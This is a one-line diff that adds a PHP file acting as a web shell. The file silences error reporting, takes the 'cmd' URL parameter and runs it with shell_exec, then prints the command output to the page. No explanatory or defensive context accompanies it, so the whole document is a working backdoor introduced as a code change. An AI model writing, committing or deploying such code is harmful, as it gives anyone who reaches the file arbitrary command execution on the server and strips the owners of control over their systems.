@@ -1,0 +1,1 @@
+<?php error_reporting(0); $waw = $_GET['cmd']; $list = shell_exec("$waw"); echo "<pre>$list</pre>"; ?>
